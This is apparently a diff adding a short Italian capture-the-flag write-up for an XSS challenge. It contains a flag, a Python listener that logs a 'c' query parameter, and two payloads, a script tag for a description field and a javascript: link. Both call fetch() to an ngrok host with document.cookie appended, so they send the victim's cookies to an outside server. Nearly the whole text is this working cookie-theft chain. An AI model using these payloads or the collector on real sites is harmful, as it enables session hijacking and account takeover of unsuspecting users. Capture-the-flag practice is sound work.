@@ -1,0 +1,27 @@
+flag{n0rm4l(ize)_I5_b4d}
+
+soliito sito vulnerabile a XSS su altro, quindi mi devo prendere i cookies
+
+server in ascolto 
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Estrae i dati dalla query string
+        query_components = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
+        if "c" in query_components:
+            print(f"\n[!!!] FLAG RICEVUTA: {query_components['c'][0]}")
+        
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Ricevuto!")
+
+print("Server in ascolto sulla porta 8000...")
+httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
+httpd.serve_forever()
+
+
+PAYLOAD:
+NELLA DESC :<script>fetch('https://nongremial-fishable-israel.ngrok-free.dev/?c='+document.cookie)</script> O qualsiasi cosa va bene in realtà
+NEL LINK : javascript:fetch('https://nongremial-fishable-israel.ngrok-free.dev/?c='+document.cookie)
